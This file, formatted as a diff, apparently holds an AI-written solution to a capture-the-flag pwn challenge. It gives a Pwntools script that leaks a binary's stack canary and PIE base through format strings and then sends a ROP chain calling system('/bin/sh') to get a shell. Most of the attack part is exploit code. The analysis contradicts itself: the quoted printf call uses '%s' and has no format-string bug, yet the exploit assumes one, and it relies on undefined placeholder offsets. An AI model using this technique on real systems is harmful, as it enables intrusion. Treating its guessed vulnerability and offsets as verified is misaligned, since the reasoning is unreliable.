@@ -1,0 +1,224 @@
+To solve this challenge using Pwntools, we'll need to perform several steps:
+
+1. **Identify Vulnerabilities**: Analyze the program to find vulnerabilities.
+2. **Leak the Stack Canary**: Use a format string vulnerability to leak the stack canary.
+3. **Leak PIE Base Address**: Leak a function address to calculate the binary's base address (since PIE is enabled).
+4. **Build a ROP Chain**: Create a ROP chain to call `system("/bin/sh")` using the leaked addresses.
+5. **Exploit the Program**: Use the gathered information to overwrite the return address and execute the ROP chain.
+
+Below is an explanation of each step along with the corresponding Pwntools code.
+
+### Step 1: Identify Vulnerabilities
+
+From the provided decompiled code and security properties, we can see:
+
+- There are buffer overflows in `hello()` function due to `read(0, buf, 0x100)` and `read(0, s1, 0x100)`.
+- The `printf()` function is called with user input:
+  ```c
+  printf("Is your name `%s` correct (yes/no)?\n", buf);
+  ```
+- Given the nature of decompiled code, it's possible that the actual code is vulnerable to a format string attack if `printf()` is incorrectly used as `printf(buf);`.
+
+### Step 2: Leak the Stack Canary
+
+First, we'll check if there's a format string vulnerability by sending format specifiers in our input and seeing if they are interpreted.
+
+**Code to Leak Stack Canary:**
+
+```python
+from pwn import *
+
+elf = ELF('./rop')
+context.binary = elf
+
+def start():
+    if args.REMOTE:
+        return remote('challenge_address', challenge_port)
+    else:
+        return process('./rop')
+
+p = start()
+
+# Receive the prompt
+p.recvuntil("Hello. What's your name?\n")
+
+# Send format string payload to leak stack canary
+payload = b'%13$p'
+p.sendline(payload)
+
+# Receive until the next prompt
+p.recvuntil("Is your name `")
+leak = p.recvuntil("` correct", drop=True)
+
+# Extract the canary
+canary = int(leak, 16)
+log.success(f"Leaked canary: {hex(canary)}")
+```
+
+**Explanation:**
+
+- We send `%13$p` as our name to leak the 13th value on the stack, which is often the stack canary.
+- We parse the program's output to extract the leaked canary value.
+
+### Step 3: Leak PIE Base Address
+
+Since PIE is enabled, all executable sections are randomized. We need to leak an address from the binary to compute the base address.
+
+**Code to Leak PIE Base Address:**
+
+```python
+# Send 'no' to repeat the loop
+p.sendline('no')
+p.recvuntil("Hello. What's your name?\n")
+
+# Leak an address from the binary to calculate PIE base
+payload = b'%15$p'  # This might leak a return address or function pointer
+p.sendline(payload)
+
+p.recvuntil("Is your name `")
+leak = p.recvuntil("` correct", drop=True)
+
+# Extract the leaked address
+leaked_addr = int(leak, 16)
+elf.address = leaked_addr - offset_to_leaked_addr  # Calculate ELF base
+log.success(f"Leaked PIE base address: {hex(elf.address)}")
+```
+
+**Explanation:**
+
+- Adjust `%15$p` based on where the binary's address is on the stack.
+- Calculate the binary's base address by subtracting the known offset of the leaked address within the binary.
+
+### Step 4: Build a ROP Chain
+
+Now that we have the canary and the PIE base address, we can build a ROP chain to call `system("/bin/sh")`.
+
+**Code to Build ROP Chain:**
+
+```python
+from pwn import *
+
+# Gadgets
+pop_rdi = elf.address + 0x0000000000001234  # Replace with actual offset
+ret = elf.address + 0x000000000000101a  # `ret` gadget to align the stack
+
+# Addresses
+bin_sh = next(elf.search(b'/bin/sh\x00'))
+system = elf.plt['system']
+
+# Build payload
+payload = b'A' * offset  # Offset to canary
+payload += p64(canary)
+payload += b'B' * 8  # Overwrite saved RBP
+payload += p64(ret)  # Align stack (if needed)
+payload += p64(pop_rdi)
+payload += p64(bin_sh)
+payload += p64(system)
+```
+
+**Explanation:**
+
+- We overwrite the buffer up to the canary.
+- Re-insert the correct canary to bypass stack protection.
+- Overwrite saved RBP and RIP with our ROP chain.
+- The ROP chain calls `system("/bin/sh")`.
+
+### Step 5: Exploit the Program
+
+Send the final payload to exploit the program and get a shell.
+
+**Final Exploit Code:**
+
+```python
+# Send 'no' to repeat the loop
+p.sendline('no')
+p.recvuntil("Hello. What's your name?\n")
+
+# Send the final payload
+p.sendline(payload)
+
+# Interact with the shell
+p.interactive()
+```
+
+### Full Pwntools Script
+
+Putting it all together, here's the complete script:
+
+```python
+from pwn import *
+
+elf = ELF('./rop')
+context.binary = elf
+
+def start():
+    if args.REMOTE:
+        return remote('challenge_address', challenge_port)
+    else:
+        return process('./rop')
+
+p = start()
+
+# Leak stack canary
+p.recvuntil("Hello. What's your name?\n")
+payload = b'%13$p'
+p.sendline(payload)
+p.recvuntil("Is your name `")
+leak = p.recvuntil("` correct", drop=True)
+canary = int(leak, 16)
+log.success(f"Leaked canary: {hex(canary)}")
+
+p.sendline('no')
+p.recvuntil("Hello. What's your name?\n")
+
+# Leak PIE base address
+payload = b'%15$p'
+p.sendline(payload)
+p.recvuntil("Is your name `")
+leak = p.recvuntil("` correct", drop=True)
+leaked_addr = int(leak, 16)
+elf.address = leaked_addr - elf_offset  # Calculate correct ELF base
+log.success(f"Leaked PIE base address: {hex(elf.address)}")
+
+p.sendline('no')
+p.recvuntil("Hello. What's your name?\n")
+
+# Build ROP chain
+pop_rdi = elf.address + gadget_offset  # Replace with the correct offsets
+ret = elf.address + ret_offset
+
+bin_sh = next(elf.search(b'/bin/sh\x00'))
+system = elf.plt['system']
+
+offset = 0x28  # Adjust based on buffer size
+payload = b'A' * offset
+payload += p64(canary)
+payload += b'B' * 8  # Overwrite saved RBP
+payload += p64(ret)
+payload += p64(pop_rdi)
+payload += p64(bin_sh)
+payload += p64(system)
+
+p.sendline(payload)
+
+# Interact with the shell
+p.interactive()
+```
+
+**Notes:**
+
+- Replace `elf_offset`, `gadget_offset`, and `ret_offset` with the correct values after analyzing the binary.
+- Adjust the offsets and format string indices based on the actual stack layout, which you can determine through testing and debugging.
+- Make sure to handle endianness and data packing (`p64()` function) correctly.
+- Use `objdump` or `ROPgadget` to find the correct gadget addresses within the PIE-enabled binary.
+
+**Explanation of the Final Script:**
+
+- We start the process and use the format string vulnerability to leak the stack canary and PIE base address.
+- We calculate the actual addresses of required gadgets and functions.
+- We build a payload that overwrites the buffer, includes the correct canary, and injects our ROP chain.
+- We send the payload to the program and interact with the shell that we get.
+
+### Conclusion
+
+By following these steps and using Pwntools effectively, you can exploit the program despite the protections in place. Remember to adjust the offsets and indices based on your environment and findings during exploitation.
